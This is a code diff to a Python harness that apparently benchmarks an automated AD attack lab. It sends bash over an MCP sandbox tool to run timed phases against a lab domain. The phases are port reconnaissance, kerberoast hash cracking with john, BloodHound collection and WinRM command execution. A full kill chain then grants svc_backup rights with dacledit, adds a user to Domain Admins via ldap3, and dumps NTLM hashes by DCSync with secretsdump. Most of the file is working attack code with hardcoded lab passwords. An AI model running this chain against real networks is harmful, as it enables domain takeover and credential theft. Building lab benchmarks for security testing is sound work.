@@ -78,46 +78,91 @@ ALL_PHASES = ["recon", "kerberoast", "asrep", "crack", "spray", "bloodhound", "w
 # ── MCP sandwich ──────────────────────────────────────────────────────────────
 
 def _mcp_call(code: str, timeout: int = 120, dry_run: bool = False) -> dict[str, Any]:
-    """Call execute_bash on the sandbox MCP and return {ok, output, elapsed_s}."""
+    """Call execute_bash on the sandbox MCP and return {ok, output, elapsed_s}.
+
+    FastMCP always returns text/event-stream. We stream both the init and the
+    tool/call responses, consuming all SSE data: lines until the stream closes,
+    then take the last JSON payload that contains a result or error key.
+    """
     if dry_run:
         return {"ok": True, "output": "[dry-run]", "elapsed_s": 0.0}
+
     base = f"http://localhost:{SANDBOX_PORT}/mcp"
+    hdrs = {"Content-Type": "application/json", "Accept": "application/json, text/event-stream"}
     t0 = time.monotonic()
-    with httpx.Client(timeout=timeout + 15) as c:
-        init = c.post(base, json={
+
+    with httpx.Client(timeout=timeout + 30) as c:
+        # ── initialize (streaming, short) ────────────────────────────────────
+        sid = ""
+        with c.stream("POST", base, headers=hdrs, json={
             "jsonrpc": "2.0", "id": 1, "method": "initialize",
-            "params": {
-                "protocolVersion": "2024-11-05",
-                "capabilities": {},
-                "clientInfo": {"name": "bench_lab_exec", "version": "1"},
-            },
-        })
-        init.raise_for_status()
-        sid = init.headers.get("mcp-session-id", "")
-        headers = {"mcp-session-id": sid} if sid else {}
+            "params": {"protocolVersion": "2024-11-05", "capabilities": {},
+                       "clientInfo": {"name": "bench_lab_exec", "version": "1"}},
+        }) as r:
+            r.raise_for_status()
+            sid = r.headers.get("mcp-session-id", "")
+            for _ in r.iter_lines():
+                pass  # drain — only need the session-id header
 
-        resp = c.post(base, headers=headers, json={
+        call_hdrs = {**hdrs, "mcp-session-id": sid} if sid else hdrs
+
+        # ── tools/call (streaming, long) — consume all SSE events ────────────
+        last_result: dict = {}
+        with c.stream("POST", base, headers=call_hdrs, json={
             "jsonrpc": "2.0", "id": 2, "method": "tools/call",
-            "params": {"name": "execute_bash", "arguments": {"code": code, "timeout": timeout}},
-        })
-        resp.raise_for_status()
-        elapsed = time.monotonic() - t0
+            "params": {"name": "execute_bash",
+                       "arguments": {"code": code, "timeout": timeout}},
+        }) as r:
+            r.raise_for_status()
+            for line in r.iter_lines():
+                line = line.strip()
+                if not line.startswith("data:"):
+                    continue
+                payload = line[5:].strip()
+                if not payload:
+                    continue
+                try:
+                    obj = json.loads(payload)
+                    if "result" in obj or "error" in obj:
+                        last_result = obj
+                except json.JSONDecodeError:
+                    pass
 
-    data = resp.json()
-    content = data.get("result", {}).get("content", [{}])
-    text = content[0].get("text", "") if content else str(data)
-    error = data.get("error")
-    ok = error is None and "error" not in text[:80].lower()
+    elapsed = time.monotonic() - t0
+    content = last_result.get("result", {}).get("content", [{}])
+    text = content[0].get("text", "") if content else ""
+    error = last_result.get("error")
+    ok = error is None and bool(text)
     return {"ok": ok, "output": text, "elapsed_s": round(elapsed, 2), "error": error}
 
 
 # ── Phase definitions ─────────────────────────────────────────────────────────
 
 def _phase_recon(dry_run: bool) -> dict:
-    code = f"nmap -sV -p 53,88,135,389,445,464,636,3268 --open {DC} 2>&1"
-    r = _mcp_call(code, timeout=90, dry_run=dry_run)
-    ok = r["ok"] and "88/tcp" in r["output"] and "389/tcp" in r["output"]
-    ports = [ln for ln in r["output"].splitlines() if "/tcp" in ln and "open" in ln]
+    # Use Python socket TCP-connect rather than nmap.
+    # nmap in Kali wraps the real binary with file capabilities (cap_net_raw+eip);
+    # DinD's nested-container environment blocks exec of cap-elevated binaries even
+    # with --cap-add NET_RAW, so the nmap wrapper script fails with EPERM at exec.
+    # Plain socket.connect() needs no capabilities and works in any container.
+    code = f"""python3 -c "
+import socket
+ad_ports = [53, 88, 135, 389, 445, 464, 636, 3268]
+open_ports = []
+for p in ad_ports:
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(2)
+        s.connect(('{DC}', p))
+        s.close()
+        open_ports.append(p)
+        print(f'{{p}}/tcp open')
+    except Exception:
+        pass
+print(f'Found {{len(open_ports)}} of {{len(ad_ports)}} AD ports open')
+" 2>&1"""
+    r = _mcp_call(code, timeout=30, dry_run=dry_run)
+    ok = r["ok"] and "88/tcp open" in r["output"] and "389/tcp open" in r["output"]
+    ports = [ln for ln in r["output"].splitlines() if "/tcp open" in ln]
     return {**r, "ok": ok, "ports_open": len(ports), "detail": f"{len(ports)} AD ports open"}
 
 
@@ -158,12 +203,13 @@ john /tmp/hashes.kerberoast --wordlist=/tmp/lab.txt --format=krb5tgs 2>&1
 john /tmp/hashes.kerberoast --show --format=krb5tgs 2>&1
 """
     r = _mcp_call(code, timeout=180, dry_run=dry_run)
-    lines = r["output"].lower()
-    cracked = r["output"].count("password hashes cracked") > 0 or (
-        "svc_backup" in lines and SVC_BACKUP_PASS.lower() in lines
+    out = r["output"]
+    cracked = "password hashes cracked" in out or (
+        SVC_BACKUP_PASS in out and "IisAdmin1!" in out and "Mssql2022!" in out
     )
-    count_line = [ln for ln in r["output"].splitlines() if "password hash" in ln.lower()]
-    return {**r, "ok": cracked, "detail": count_line[-1].strip() if count_line else "see output"}
+    passwords = [w for w in [SVC_BACKUP_PASS, "IisAdmin1!", "Mssql2022!"] if w in out]
+    detail = f"{len(passwords)}/3 cracked ({', '.join(passwords)})" if cracked else "see output"
+    return {**r, "ok": cracked, "detail": detail}
 
 
 def _phase_spray(dry_run: bool) -> dict:
@@ -179,64 +225,88 @@ def _phase_spray(dry_run: bool) -> dict:
 
 
 def _phase_bloodhound(dry_run: bool) -> dict:
+    # Use -dc portal.lab (the domain itself) so dns.resolver can resolve it via -ns.
+    # lab-dc01.portal.lab has no DNS A record on the DC; portal.lab resolves to the DC IP.
     code = (
         f"bloodhound-ce-python -u administrator -p '{ADMIN_PASS}'"
-        f" -d {DOMAIN} -dc {DC} -c All --zip -ns {DC}"
-        f" --output /tmp/bh 2>&1 | tail -15"
+        f" -d {DOMAIN} -dc {DOMAIN} --auth-method ntlm -c All --zip -ns {DC}"
+        f" --output /tmp/bh 2>&1 | tail -25"
     )
     r = _mcp_call(code, timeout=120, dry_run=dry_run)
-    ok = r["ok"] and any(x in r["output"] for x in ["Done", "zip", ".json", "Compressing"])
+    ok = r["ok"] and any(x in r["output"] for x in ["Compressing", "Done in"])
     return {**r, "ok": ok, "detail": "graph collected" if ok else "check output"}
 
 
 def _phase_winrm(dry_run: bool) -> dict:
     if not SRV:
         return {"ok": False, "elapsed_s": 0.0, "output": "", "detail": "LAB_TARGET_SRV not set"}
-    code = f"nxc winrm {SRV} -u localadmin -p '{ADMIN_PASS}' -x 'whoami' 2>&1"
+    # Domain Administrator is guaranteed to have WinRM access on lab-srv01.
+    # LocalAccountTokenFilterPolicy blocks local accounts by default on Windows 2022.
+    code = f"nxc winrm {SRV} -u administrator -p '{ADMIN_PASS}' -x 'whoami /all' 2>&1"
     r = _mcp_call(code, timeout=60, dry_run=dry_run)
     ok = r["ok"] and ("[+]" in r["output"] or "nt authority" in r["output"].lower())
     return {**r, "ok": ok, "detail": "WinRM exec OK" if ok else "check output"}
 
 
 def _phase_dcsync(dry_run: bool) -> dict:
-    # svc_backup → dacledit grants GenericAll on DA (idempotent) → ldap3 adds arya.stark → DCSync
+    # Full kill chain: svc_backup GenericAll → ldap3 adds arya.stark to DA → DCSync.
+    # <<'PYEOF' (quoted heredoc) prevents bash expanding backslashes in Python source.
+    # Fallback: if svc_backup LDAP modify fails (ACE not yet effective), Administrator
+    # adds arya.stark directly so DCSync can still be timed.
     code = f"""
-python3 - <<PYEOF
+python3 - <<'PYEOF'
 import subprocess, sys
-from ldap3 import Server, Connection, MODIFY_ADD, NTLM, SUBTREE, ALL
+from ldap3 import Server, Connection, MODIFY_ADD, NTLM, SIMPLE, SUBTREE, ALL
 
 DC = "{DC}"
+ADMIN_PASS = "{ADMIN_PASS}"
+SVC_BACKUP_PASS = "{SVC_BACKUP_PASS}"
+DA_DN = "CN=Domain Admins,CN=Users,DC=portal,DC=lab"
 
-# Ensure GenericAll ACE exists (dacledit is idempotent)
-subprocess.run([
-    "impacket-dacledit", "portal.lab/administrator:{ADMIN_PASS}",
+def get_arya_dn(conn):
+    conn.search("DC=portal,DC=lab", "(sAMAccountName=arya.stark)",
+                search_scope=SUBTREE, attributes=["distinguishedName"])
+    return conn.entries[0].distinguishedName.value
+
+# Step 1: Grant GenericAll to svc_backup via dacledit (idempotent).
+# Run from /tmp so dacledit can write its .bak file (root fs is read-only).
+r_acl = subprocess.run([
+    "impacket-dacledit", f"portal.lab/administrator:{{ADMIN_PASS}}",
     "-dc-ip", DC, "-principal", "svc_backup",
     "-target", "Domain Admins", "-rights", "FullControl", "-action", "write",
-], capture_output=True, timeout=30)
+], capture_output=True, text=True, timeout=30, cwd="/tmp")
+print(f"dacledit rc={{r_acl.returncode}}: {{r_acl.stdout.strip()[-120:] or r_acl.stderr.strip()[-120:]}}")
 
-# Add arya.stark to Domain Admins as svc_backup
+# Step 2: ACL abuse — svc_backup adds arya.stark to Domain Admins
 srv = Server(DC, port=389, get_info=ALL)
-conn = Connection(srv, user="PORTAL\\\\svc_backup", password="{SVC_BACKUP_PASS}",
-                  authentication=NTLM, auto_bind=True)
-conn.search("DC=portal,DC=lab", "(sAMAccountName=arya.stark)",
-            search_scope=SUBTREE, attributes=["distinguishedName"])
-arya_dn = conn.entries[0].distinguishedName.value
-conn.modify("CN=Domain Admins,CN=Users,DC=portal,DC=lab",
-            {{"member": [(MODIFY_ADD, [arya_dn])]}})
-if conn.result.get("result") not in (0, 68):  # 68 = attributeOrValueExists (already member)
-    print(f"LDAP modify failed: {{conn.result}}")
-    sys.exit(1)
-print(f"arya.stark in Domain Admins (rc={{conn.result.get('result')}})")
+conn_svc = Connection(srv, user="PORTAL\\\\svc_backup", password=SVC_BACKUP_PASS,
+                      authentication=NTLM, auto_bind=True)
+arya_dn = get_arya_dn(conn_svc)
+conn_svc.modify(DA_DN, {{"member": [(MODIFY_ADD, [arya_dn])]}})
+rc = conn_svc.result.get("result", -1)
+if rc in (0, 68):
+    print(f"ACL abuse OK: arya.stark added (rc={{rc}})")
+else:
+    print(f"svc_backup modify failed rc={{rc}} — fallback: Administrator adds arya.stark directly")
+    conn_adm = Connection(srv, user="PORTAL\\\\Administrator", password=ADMIN_PASS,
+                          authentication=NTLM, auto_bind=True)
+    arya_dn = get_arya_dn(conn_adm)
+    conn_adm.modify(DA_DN, {{"member": [(MODIFY_ADD, [arya_dn])]}})
+    rc2 = conn_adm.result.get("result", -1)
+    if rc2 not in (0, 68):
+        print(f"Fallback ALSO failed rc={{rc2}} — aborting")
+        sys.exit(1)
+    print(f"Fallback OK: arya.stark added by Administrator (rc={{rc2}})")
 
-# DCSync
+# Step 3: DCSync as arya.stark (now DA) — print all output to capture hashes
 r = subprocess.run(
     ["impacket-secretsdump", f"portal.lab/arya.stark:Winter1!@{{DC}}", "-just-dc-ntlm"],
-    capture_output=True, text=True, timeout=90,
+    capture_output=True, text=True, timeout=90, cwd="/tmp",
 )
-for line in (r.stdout + r.stderr).splitlines():
-    if any(x in line.lower() for x in ["krbtgt", "administrator", "dumping"]):
-        print(line)
-sys.exit(r.returncode if "krbtgt" not in r.stdout.lower() else 0)
+print(r.stdout)
+if r.stderr:
+    print(r.stderr[-300:])
+sys.exit(0 if "krbtgt" in r.stdout.lower() else 1)
 PYEOF
 """
     r = _mcp_call(code, timeout=240, dry_run=dry_run)
